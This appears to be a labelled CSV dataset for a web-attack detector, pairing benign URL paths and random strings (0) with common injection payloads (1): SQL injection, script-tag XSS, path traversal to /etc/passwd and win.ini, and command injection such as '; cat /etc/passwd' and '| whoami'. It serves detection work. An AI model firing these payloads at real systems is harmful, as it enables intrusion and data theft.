' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?id=3666,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
search,0
IJWup7DST,0
oe1UW0mstpTSq,0
xeBwU2qcmsV,0
admin' --,1
/register?session=71922,0
search,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/register?id=6352,0
/settings?session=93378,0
' OR 1=1 --,1
admin%00' OR 1=1,1
1' o r '1'='1,1
EbiCfsGaXvc,0
home,0
<script>var a=27;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
xnxDEEXK,0
cYzAaSNo,0
<script>var a=507;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
profile,0
profile,0
/checkout?id=7195,0
/contact?session=78047,0
s E l E c T * f R o M a d m i n,1
/search?id=3883,0
Qjcq96Dq7NMicd,0
' OR 9=8 --,1
index,0
/register?session=50157,0
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
../../../windows/win.ini,1
/search?session=84453,0
/user?session=40956,0
search,0
/blog?session=33043,0
/settings?session=90751,0
bzNWFONSMqwqdU,0
about,0
../../../windows/win.ini,1
register,0
javascript:alert(1),1
bUxgljw7A,0
/dashboard?session=15268,0
<script>var a=65;alert(a)</script>,1
/home?session=55211,0
user,0
/contact?session=33957,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
1a7PAwyMdG2f,0
' OR 3=4 --,1
s E l E c T * f R o M a d m i n,1
/checkout?session=43059,0
cart,0
ZprsNW2rX0f6,0
7pbmCmIZYrh1JbF,0
<script>var a=689;alert(a)</script>,1
/checkout?id=6559,0
/settings?session=84270,0
' OR 1=1 --,1
Ysys4A5tWB70Ts,0
<script>var a=652;alert(a)</script>,1
/dashboard?id=9029,0
/register?id=1490,0
hc5eQrG5JRU,0
/user?session=44951,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?session=30327,0
../../../../etc/passwd,1
blog,0
1' o r '1'='1,1
0lARe8RLImO5qa0,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?session=19431,0
javascript:alert(1),1
profile,0
y7rcIvpFWbw79,0
<script>var a=204;alert(a)</script>,1
dashboard,0
<script>var a=571;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/checkout?id=7542,0
register,0
/dashboard?session=88092,0
gRfSCVAtxxk,0
1' o r '1'='1,1
admin' --,1
/about?session=94182,0
' OR 7=4 --,1
1' o r '1'='1,1
/blog?session=31437,0
s E l E c T * f R o M a d m i n,1
checkout,0
' OR 2=8 --,1
<script>var a=563;alert(a)</script>,1
<script>var a=432;alert(a)</script>,1
/login?session=41949,0
<script>var a=609;alert(a)</script>,1
/login?session=20416,0
BRW1w7bBfj,0
/settings?id=4501,0
../../../windows/win.ini,1
<script>var a=618;alert(a)</script>,1
javascript:alert(1),1
/index?id=2273,0
' OR 6=7 --,1
../../../windows/win.ini,1
/login?id=2844,0
/settings?session=84628,0
Z6vmc2g47y9,0
0akmEZBTDqpT,0
register,0
' OR 1=1 --,1
home,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR '1'='1,1
admin%00' OR 1=1,1
1' o r '1'='1,1
1' o r '1'='1,1
| whoami,1
dashboard,0
PM5RJKPABRH,0
user,0
uX1HXk8fY,0
' OR '1'='1,1
uVHc9558GcaQOC,0
1' o r '1'='1,1
; cat /etc/passwd,1
KBlJix5Hq0dPTne,0
<script>alert(document.cookie)</script>,1
s8jM8NiY6O1P,0
/register?id=4489,0
XFHZEPIjLW5,0
/dashboard?id=4455,0
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
' OR 2=7 --,1
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
settings,0
/index?id=3244,0
/dashboard?id=4240,0
yNs7EkOYwIg,0
/user?id=6363,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
settings,0
/index?id=8608,0
evyKmnzbvtO,0
fy6cVAkv,0
onerror=alert(1),1
<script>var a=62;alert(a)</script>,1
onerror=alert(1),1
' OR 2=5 --,1
' OR 1=4 --,1
admin' --,1
/register?id=5752,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=48,0
<script>var a=816;alert(a)</script>,1
/checkout?id=6076,0
onerror=alert(1),1
1' o r '1'='1,1
../../../windows/win.ini,1
1' o r '1'='1,1
' OR '1'='1,1
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin%00' OR 1=1,1
login,0
' OR 1=1 --,1
VK4tcDeOH,0
<script>alert(document.cookie)</script>,1
index,0
r7pXWRNbSbFdQBz,0
PBzy8yXtgc8M,0
../../../../etc/passwd,1
javascript:alert(1),1
/register?id=4900,0
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
QDCaR74KT,0
; cat /etc/passwd,1
admin'/* bypass */OR 1=1,1
' OR 5=7 --,1
cart,0
admin%00' OR 1=1,1
<script>var a=823;alert(a)</script>,1
onerror=alert(1),1
Zxk4ZYVioRZ,0
/index?id=9654,0
contact,0
/settings?session=11583,0
' OR 1=1 --,1
<script>var a=905;alert(a)</script>,1
' OR '1'='1,1
cart,0
<script>var a=850;alert(a)</script>,1
/about?id=54,0
/settings?session=37166,0
' OR 9=2 --,1
<script>var a=869;alert(a)</script>,1
' OR 2=5 --,1
login,0
/dashboard?id=5249,0
' OR 1=3 --,1
admin%00' OR 1=1,1
ScUkrgTHW,0
about,0
/index?session=55387,0
admin' --,1
../../../../etc/passwd,1
' OR 1=7 --,1
/login?session=25828,0
6gCyLKqObP9,0
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?session=68503,0
<script>var a=685;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
/register?session=40752,0
javascript:alert(1),1
dashboard,0
/blog?session=33596,0
blog,0
/contact?session=56876,0
/contact?session=35648,0
admin%00' OR 1=1,1
<script>var a=618;alert(a)</script>,1
' OR 1=1 --,1
' OR 4=1 --,1
' OR 1=9 --,1
<script>var a=395;alert(a)</script>,1
admin' --,1
' OR 7=4 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
/settings?session=44845,0
search,0
blog,0
checkout,0
/profile?session=96446,0
/profile?id=8189,0
' OR 2=5 --,1
kt2NGOg2ap,0
/user?session=51073,0
user,0
' OR 1=1 --,1
/about?session=23329,0
checkout,0
MXnfnoDV6Lw83Xr,0
/register?session=36245,0
/user?session=39388,0
profile,0
/profile?session=96720,0
javascript:alert(1),1
wiFXsJt72lUJ,0
<script>var a=906;alert(a)</script>,1
<script>var a=686;alert(a)</script>,1
/dashboard?id=2374,0
admin'/* bypass */OR 1=1,1
<script>var a=736;alert(a)</script>,1
mnfyNoln,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=210;alert(a)</script>,1
javascript:alert(1),1
jGdv5d5M6XZbo,0
/index?session=87313,0
ueaoSz1niG52o,0
BeybE4mVUlP,0
onerror=alert(1),1
' OR 1=6 --,1
qqZW95sNtXMPr42,0
/dashboard?id=8837,0
' OR 6=8 --,1
zgTQI5jiy7Hupu,0
' OR 1=7 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/index?id=7332,0
eZAWJpDGFOa,0
/login?id=121,0
about,0
/blog?session=11996,0
| whoami,1
' OR '1'='1,1
dashboard,0
dt90zMGd,0
/dashboard?id=9760,0
../../../../etc/passwd,1
1' o r '1'='1,1
about,0
' OR 1=6 --,1
' OR 1=1 --,1
/dashboard?id=1354,0
admin'/* bypass */OR 1=1,1
/register?id=1900,0
/index?id=7016,0
XRMbgqmqX0d,0
/profile?session=16401,0
| whoami,1
' OR 8=7 --,1
contact,0
c1kMq50tgT,0
<script>var a=61;alert(a)</script>,1
/contact?id=5497,0
/index?session=58705,0
U4LLFkKdi95aymt,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?session=61672,0
/profile?id=1832,0
javascript:alert(1),1
/profile?id=4776,0
uusJFdjikYy,0
2GGygkKl9TlxfqQ,0
/index?id=7703,0
/user?id=251,0
' OR 3=3 --,1
' OR 1=1 --,1
about,0
/blog?id=1219,0
9kClCyJZTZSsx,0
/blog?id=1760,0
GsDjBMAjms2jgJ,0
7zNL0UbYdtCIG,0
dashboard,0
| whoami,1
cjsRTud4Yb,0
/contact?session=90741,0
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
<script>var a=928;alert(a)</script>,1
' OR '1'='1,1
/blog?id=199,0
/settings?session=41261,0
s E l E c T * f R o M a d m i n,1
/register?id=3807,0
/profile?id=7110,0
<script>var a=538;alert(a)</script>,1
eweHXhaTVaXZuP5,0
/user?id=2707,0
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/index?session=49619,0
/login?id=9360,0
<script>var a=469;alert(a)</script>,1
| whoami,1
/user?session=94286,0
about,0
/cart?id=2654,0
' OR 9=2 --,1
javascript:alert(1),1
' OR 1=1 --,1
KBFSU8YPrubALB,0
<script>var a=997;alert(a)</script>,1
Px6e1oLF,0
/profile?id=7940,0
zkJlmojsyZ,0
admin%00' OR 1=1,1
<script>var a=82;alert(a)</script>,1
home,0
3ebazEtSOx7,0
home,0
/login?session=84923,0
/search?id=3491,0
/index?id=7038,0
<script>var a=646;alert(a)</script>,1
/register?session=68797,0
' OR 3=6 --,1
8TusMljK5,0
lPmyW96P,0
admin%00' OR 1=1,1
' OR 7=3 --,1
/user?id=168,0
<script>var a=522;alert(a)</script>,1
' OR 4=1 --,1
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
blog,0
dashboard,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?session=93718,0
/register?session=64616,0
' OR '1'='1,1
/search?id=4584,0
1' o r '1'='1,1
qGXeDJjc,0
WHt7TAfNwe7,0
<script>alert(document.cookie)</script>,1
dashboard,0
/profile?session=60099,0
' OR 1=1 --,1
/login?session=59475,0
s E l E c T * f R o M a d m i n,1
/register?session=87161,0
' OR 4=3 --,1
search,0
about,0
| whoami,1
GiK9K0ONJRW,0
<script>var a=939;alert(a)</script>,1
/contact?session=95015,0
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
; cat /etc/passwd,1
MOarsunfw4,0
login,0
<script>var a=218;alert(a)</script>,1
/cart?session=13540,0
' OR 2=4 --,1
../../../windows/win.ini,1
/index?session=13737,0
/blog?session=95287,0
blog,0
W4TXGgkn,0
checkout,0
B9MAYh80H6Hxk,0
javascript:alert(1),1
dashboard,0
<script>var a=718;alert(a)</script>,1
<script>var a=437;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 6=3 --,1
/checkout?session=27945,0
/settings?id=1545,0
../../../../etc/passwd,1
' OR 3=7 --,1
3vHsoiWgM0,0
/cart?id=300,0
/checkout?id=3677,0
../../../windows/win.ini,1
admin%00' OR 1=1,1
contact,0
VROcK6BOK,0
' OR 1=1 --,1
nJ2SdjFGRcH,0
/blog?session=90993,0
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=679;alert(a)</script>,1
/about?session=70820,0
cart,0
admin%00' OR 1=1,1
' OR 8=4 --,1
rvdWhuBUFC,0
/cart?id=8039,0
/contact?id=4168,0
9e8PIgyntO95,0
/search?id=6830,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
onerror=alert(1),1
| whoami,1
/profile?id=5081,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
login,0
admin%00' OR 1=1,1
dashboard,0
../../../windows/win.ini,1
<script>var a=325;alert(a)</script>,1
/search?id=7596,0
La7lG6rfXw2,0
vwd5Vf2yQt3IsI,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
<script>var a=460;alert(a)</script>,1
/dashboard?id=8678,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
dashboard,0
javascript:alert(1),1
/cart?id=5444,0
/about?id=7363,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
OgMcGxVXLXcEYx,0
admin'/* bypass */OR 1=1,1
/user?session=74217,0
s E l E c T * f R o M a d m i n,1
SqhvlTnwGif,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
8VeEsCUxm6H3,0
' OR '1'='1,1
GlUZgQNON,0
ti25hO8jd5,0
/checkout?id=4428,0
' OR 2=4 --,1
/checkout?session=23827,0
admin' --,1
' OR 3=3 --,1
admin%00' OR 1=1,1
' OR 7=9 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=9 --,1
../../../../etc/passwd,1
s E l E c T * f R o M a d m i n,1
/register?id=1811,0
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
settings,0
' OR 9=8 --,1
<script>var a=483;alert(a)</script>,1
contact,0
uHPHVCwcaesvt,0
checkout,0
/settings?session=92683,0
s E l E c T * f R o M a d m i n,1
/login?id=9742,0
javascript:alert(1),1
<script>var a=206;alert(a)</script>,1
fAbPsf4jnN83oX,0
search,0
/dashboard?session=63396,0
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
settings,0
dashboard,0
' OR 7=4 --,1
dashboard,0
settings,0
1' o r '1'='1,1
| whoami,1
<script>var a=951;alert(a)</script>,1
/home?session=94874,0
9124HmUE,0
1' o r '1'='1,1
onerror=alert(1),1
/login?session=36653,0
settings,0
/about?id=2551,0
<script>var a=658;alert(a)</script>,1
dashboard,0
admin%00' OR 1=1,1
C8cqUooyBEvQU,0
javascript:alert(1),1
dashboard,0
dashboard,0
Aj4aooDNkutyW,0
1' o r '1'='1,1
<script>var a=17;alert(a)</script>,1
/settings?session=16211,0
ptDniFPnY1p8lf,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 4=2 --,1
/user?session=28128,0
admin'/* bypass */OR 1=1,1
/register?session=62112,0
/login?id=8585,0
/contact?session=79533,0
dQyWP7nwIlP,0
/profile?session=36332,0
onerror=alert(1),1
' OR '1'='1,1
' OR 1=8 --,1
admin' --,1
' OR 1=9 --,1
../../../../etc/passwd,1
../../../../etc/passwd,1
/dashboard?id=915,0
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
/index?id=5617,0
ApjJCRoF,0
admin%00' OR 1=1,1
/index?session=35658,0
/contact?id=1552,0
admin' --,1
../../../../etc/passwd,1
user,0
/contact?session=37402,0
' OR 8=2 --,1
' OR 6=7 --,1
' OR 3=9 --,1
/blog?id=5796,0
/home?id=4263,0
/contact?session=29753,0
admin' --,1
H4QWFZsMY4OlJ,0
javascript:alert(1),1
' OR 4=6 --,1
' OR 5=7 --,1
admin%00' OR 1=1,1
' OR 2=6 --,1
/checkout?id=7199,0
../../../../etc/passwd,1
1' o r '1'='1,1
/cart?id=7488,0
/profile?id=595,0
1' o r '1'='1,1
/blog?session=83987,0
cart,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
GLknrTE1kv,0
../../../../etc/passwd,1
/register?session=64524,0
rv4LzefvVfa,0
<script>alert(document.cookie)</script>,1
../../../../etc/passwd,1
dashboard,0
| whoami,1
' OR 6=9 --,1
<script>var a=408;alert(a)</script>,1
../../../../etc/passwd,1
J1XhKy4SrEU47,0
/user?session=46189,0
<script>var a=605;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/checkout?session=19135,0
search,0
' OR 1=8 --,1
<script>var a=716;alert(a)</script>,1
../../../../etc/passwd,1
<script>var a=304;alert(a)</script>,1
../../../windows/win.ini,1
/blog?session=10950,0
admin' --,1
/profile?session=50731,0
/search?id=1107,0
home,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
13ZsBCmTxt,0
<script>var a=676;alert(a)</script>,1
AzePpzvf9fbIjuL,0
/search?id=2333,0
/user?session=85858,0
' OR 6=1 --,1
/settings?id=4668,0
<script>var a=305;alert(a)</script>,1
/register?session=56613,0
/search?id=2956,0
Ysb7kjiucCs9o,0
' OR 7=9 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
contact,0
admin' --,1
/register?session=94019,0
' OR 5=4 --,1
/about?session=76764,0
/contact?id=7061,0
contact,0
cart,0
settings,0
s E l E c T * f R o M a d m i n,1
' OR 2=1 --,1
<script>var a=607;alert(a)</script>,1
/about?id=7369,0
<script>var a=653;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
admin'/* bypass */OR 1=1,1
/home?session=75924,0
/about?session=27904,0
../../../../etc/passwd,1
/contact?session=27065,0
<script>var a=324;alert(a)</script>,1
' OR 4=4 --,1
index,0
' OR 1=1 --,1
<script>var a=562;alert(a)</script>,1
/settings?session=18479,0
066QfKck11,0
<script>var a=289;alert(a)</script>,1
VREUoIYRyz,0
/blog?id=952,0
onerror=alert(1),1
/dashboard?id=1278,0
hhRhopbK,0
; cat /etc/passwd,1
FhG1bCK5kR,0
checkout,0
/search?id=841,0
../../../windows/win.ini,1
settings,0
/search?session=64287,0
<script>var a=579;alert(a)</script>,1
admin' --,1
' OR '1'='1,1
WiV0OBSPMV4KAWV,0
/blog?id=1414,0
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
EaKpMOcwznUrmp,0
search,0
dashboard,0
dashboard,0
register,0
' OR '1'='1,1
' OR 3=6 --,1
home,0
/checkout?session=73132,0
settings,0
settings,0
/index?session=83853,0
1' o r '1'='1,1
/home?id=4992,0
../../../../etc/passwd,1
/search?session=51448,0
4Jn2ielmxirXuf,0
s1LlvTkoY,0
/settings?session=41523,0
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
<script>var a=607;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
' OR 7=3 --,1
onerror=alert(1),1
<script>var a=29;alert(a)</script>,1
/index?session=74670,0
73kGb86z9umBHH,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
' OR 3=3 --,1
/index?session=74191,0
' OR 9=1 --,1
| whoami,1
nXxleKtjuiCBRzQ,0
index,0
BDq3WLLE3siPqDZ,0
index,0
profile,0
/user?session=34655,0
/settings?session=74147,0
blog,0
' OR 7=4 --,1
/blog?session=55519,0
home,0
<script>var a=26;alert(a)</script>,1
| whoami,1
javascript:alert(1),1
/about?session=90846,0
S8aUWsocqt2zpmg,0
../../../windows/win.ini,1
user,0
; cat /etc/passwd,1
index,0
profile,0
user,0
/settings?id=8065,0
../../../windows/win.ini,1
admin%00' OR 1=1,1
' OR 2=8 --,1
about,0
<script>var a=970;alert(a)</script>,1
checkout,0
USnRQgni8Zp7g,0
onerror=alert(1),1
/user?session=84441,0
/blog?session=93507,0
admin%00' OR 1=1,1
<script>var a=326;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR '1'='1,1
<script>var a=615;alert(a)</script>,1
/index?id=7731,0
' OR 7=9 --,1
/user?session=39834,0
/register?session=97736,0
home,0
' OR 9=9 --,1
qWgIv3O5,0
admin%00' OR 1=1,1
<script>var a=506;alert(a)</script>,1
<script>var a=771;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=77192,0
<script>var a=193;alert(a)</script>,1
' OR '1'='1,1
admin%00' OR 1=1,1
/user?id=3795,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
onerror=alert(1),1
/home?session=75840,0
KywwdqQxRyn2I,0
/user?session=95318,0
EOKgpSHwN,0
/user?id=7414,0
' OR '1'='1,1
FDdI1YQuqN68P5,0
; cat /etc/passwd,1
index,0
blog,0
/about?session=55306,0
onerror=alert(1),1
rQPwouiWU,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
../../../windows/win.ini,1
settings,0
admin' --,1
X4ZQTXxC76,0
s E l E c T * f R o M a d m i n,1
/user?session=89500,0
/register?session=67459,0
jTc7OwtIp,0
<script>var a=868;alert(a)</script>,1
javascript:alert(1),1
RqWtOQtAL,0
<script>var a=450;alert(a)</script>,1
/search?session=47596,0
/profile?session=68103,0
IGbbFOpH,0
home,0
/about?id=6236,0
fJtDgPtz,0
about,0
bCZQ2h1Vnqnwu,0
' OR 5=5 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?id=1846,0
/contact?session=50785,0
WSrx4FRp2vUiHh,0
1' o r '1'='1,1
javascript:alert(1),1
<script>var a=303;alert(a)</script>,1
../../../../etc/passwd,1
onerror=alert(1),1
contact,0
' OR 9=2 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
' OR 8=3 --,1
/cart?session=47174,0
/search?id=6127,0
/home?id=3319,0
<script>var a=80;alert(a)</script>,1
settings,0
/search?id=322,0
onerror=alert(1),1
RCsNZEyZyBI3,0
/dashboard?id=8025,0
/search?session=78561,0
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
| whoami,1
' OR 8=3 --,1
<script>var a=327;alert(a)</script>,1
../../../windows/win.ini,1
sM9Wb8TXZ,0
/cart?session=28564,0
dashboard,0
contact,0
../../../../etc/passwd,1
/index?id=7149,0
LO3ceAzqM7pH,0
1' o r '1'='1,1
/home?session=97359,0
/dashboard?id=9125,0
' OR 6=5 --,1
' OR 1=1 --,1
contact,0
U58FvzU0XEcWFNN,0
aQLG512JZL,0
<script>var a=766;alert(a)</script>,1
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
95EMn5fAlw,0
admin'/* bypass */OR 1=1,1
' OR 8=9 --,1
<script>var a=942;alert(a)</script>,1
dfHudMpu,0
yM3Opfh7,0
' OR 1=1 --,1
UajJEpyxg0,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
blog,0
9hFxmUOdEOX,0
vOAE4gRxKS24Y,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
../../../../etc/passwd,1
' OR 5=7 --,1
/checkout?id=1204,0
; cat /etc/passwd,1
<script>var a=932;alert(a)</script>,1
/contact?session=67620,0
search,0
' OR 1=8 --,1
contact,0
| whoami,1
<script>alert(document.cookie)</script>,1
<script>var a=989;alert(a)</script>,1
' OR 2=1 --,1
home,0
TarCoNh7MDeq,0
/profile?session=59919,0
/profile?session=89894,0
' OR 1=1 --,1
search,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
settings,0
/profile?id=9759,0
s E l E c T * f R o M a d m i n,1
/search?session=30153,0
../../../../etc/passwd,1
' OR 5=3 --,1
bhBKIqZn,0
search,0
uv4WjKa2,0
/home?id=6468,0
<script>alert(document.cookie)</script>,1
/search?id=1019,0
/checkout?session=98741,0
about,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=243;alert(a)</script>,1
register,0
admin' --,1
' OR 6=5 --,1
/register?session=98061,0
<script>var a=757;alert(a)</script>,1
/dashboard?id=9434,0
' OR 5=3 --,1
home,0
/about?id=6974,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
/blog?id=6756,0
/index?session=11183,0
/cart?id=8975,0
o2NRmcdh,0
/index?session=25854,0
A6BQerD6NXdV,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?id=9057,0
/dashboard?session=63139,0
' OR 4=6 --,1
admin'/* bypass */OR 1=1,1
<script>var a=575;alert(a)</script>,1
contact,0
/blog?session=22117,0
/profile?id=6063,0
login,0
admin' --,1
/contact?session=87101,0
/login?session=73440,0
onerror=alert(1),1
/dashboard?id=8661,0
' OR 5=7 --,1
<script>var a=258;alert(a)</script>,1
' OR 6=1 --,1
admin' --,1
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?session=30857,0
admin'/* bypass */OR 1=1,1
vXLonx4pSotQ,0
| whoami,1
<script>var a=536;alert(a)</script>,1
/user?id=4699,0
' OR 1=1 --,1
' OR 9=2 --,1
/contact?session=38462,0
' OR 1=1 --,1
| whoami,1
1' o r '1'='1,1
../../../windows/win.ini,1
settings,0
' OR '1'='1,1
search,0
/cart?session=30052,0
MUOBGsgQMktW,0
admin%00' OR 1=1,1
FAehaIOKm,0
/user?session=24986,0
| whoami,1
/settings?session=17176,0
' OR '1'='1,1
about,0
2BTjuYbC,0
/cart?id=5328,0
<script>var a=685;alert(a)</script>,1
7j2dCFMe0,0
1' o r '1'='1,1
<script>var a=600;alert(a)</script>,1
<script>var a=895;alert(a)</script>,1
<script>var a=95;alert(a)</script>,1
' OR 5=3 --,1
/about?id=9718,0
VfhDLM0pC9B,0
' OR 4=6 --,1
settings,0
cart,0
' OR 8=7 --,1
/login?session=94897,0
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
qeVNl1rwk,0
<script>var a=259;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
user,0
' OR 9=5 --,1
<script>var a=403;alert(a)</script>,1
admin%00' OR 1=1,1
/index?id=9504,0
' OR '1'='1,1
<script>var a=278;alert(a)</script>,1
cart,0
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
/home?session=41459,0
TEjuAi1NUrbHJox,0
xmQgMXoGNA,0
admin%00' OR 1=1,1
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/register?session=67586,0
home,0
; cat /etc/passwd,1
VD6GgXoORnqRA8p,0
' OR '1'='1,1
<script>var a=351;alert(a)</script>,1
' OR 1=1 --,1
| whoami,1
' OR '1'='1,1
/register?id=9526,0
' OR 1=9 --,1
login,0
' OR '1'='1,1
../../../windows/win.ini,1
/login?id=4412,0
/user?session=91850,0
/checkout?id=9485,0
<script>var a=241;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=50841,0
<script>alert(document.cookie)</script>,1
<script>var a=992;alert(a)</script>,1
/about?id=2976,0
/checkout?session=93234,0
<script>var a=292;alert(a)</script>,1
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
contact,0
lmIiHzc9yAX,0
<script>var a=54;alert(a)</script>,1
javascript:alert(1),1
' OR 8=7 --,1
9xl0anEZMHO6jd,0
dashboard,0
/home?session=29847,0
<script>var a=61;alert(a)</script>,1
onerror=alert(1),1
/index?id=8762,0
/blog?session=94967,0
/user?id=1366,0
/settings?session=62596,0
admin' --,1
checkout,0
/user?session=29979,0
/checkout?session=47298,0
ISwqjiUHeSu,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 4=8 --,1
<script>alert(document.cookie)</script>,1
EOHMIjt4,0
; cat /etc/passwd,1
onerror=alert(1),1
hPlX1rUgj55dM7,0
onerror=alert(1),1
' OR 9=2 --,1
profile,0
user,0
1' o r '1'='1,1
search,0
vKxeip9cVco,0
EnEQ1zrE8mI6zq,0
<script>var a=514;alert(a)</script>,1
/checkout?id=661,0
bTQQpUJb,0
' OR '1'='1,1
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?session=44382,0
profile,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 2=5 --,1
/blog?session=94917,0
onerror=alert(1),1
/about?id=2891,0
user,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/about?session=48959,0
/profile?session=15168,0
/user?id=1263,0
' OR 9=8 --,1
| whoami,1
/dashboard?id=5835,0
/index?id=6757,0
user,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
/login?session=89807,0
<script>var a=752;alert(a)</script>,1
/search?session=31397,0
/register?session=78899,0
/about?session=45093,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?id=8444,0
user,0
/settings?session=65092,0
/register?id=4131,0
admin' --,1
1' o r '1'='1,1
<script>var a=715;alert(a)</script>,1
admin' --,1
/register?session=14739,0
' OR 3=3 --,1
kj2dCcYNLWg,0
/search?session=12886,0
blog,0
/index?session=30325,0
/checkout?session=75974,0
contact,0
../../../../etc/passwd,1
admin' --,1
index,0
admin'/* bypass */OR 1=1,1
<script>var a=250;alert(a)</script>,1
/home?session=31939,0
javascript:alert(1),1
../../../windows/win.ini,1
' OR '1'='1,1
/dashboard?session=56776,0
admin%00' OR 1=1,1
hzJIuovtYQqlw,0
Z9WiMWKHntnLBZi,0
admin%00' OR 1=1,1
<script>var a=200;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
7fBMIsogVBxiwbQ,0
/index?id=70,0
| whoami,1
' OR 8=9 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
cart,0
search,0
/index?session=57177,0
/search?session=43775,0
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
/login?session=13686,0
' OR 1=1 --,1
aBLN2T5AY1oPF,0
/home?session=57036,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
index,0
/dashboard?session=95559,0
../../../windows/win.ini,1
home,0
admin%00' OR 1=1,1
<script>var a=460;alert(a)</script>,1
<script>var a=981;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/login?session=87414,0
contact,0
javascript:alert(1),1
' OR 1=1 --,1
profile,0
search,0
' OR 9=6 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=99;alert(a)</script>,1
/profile?id=1267,0
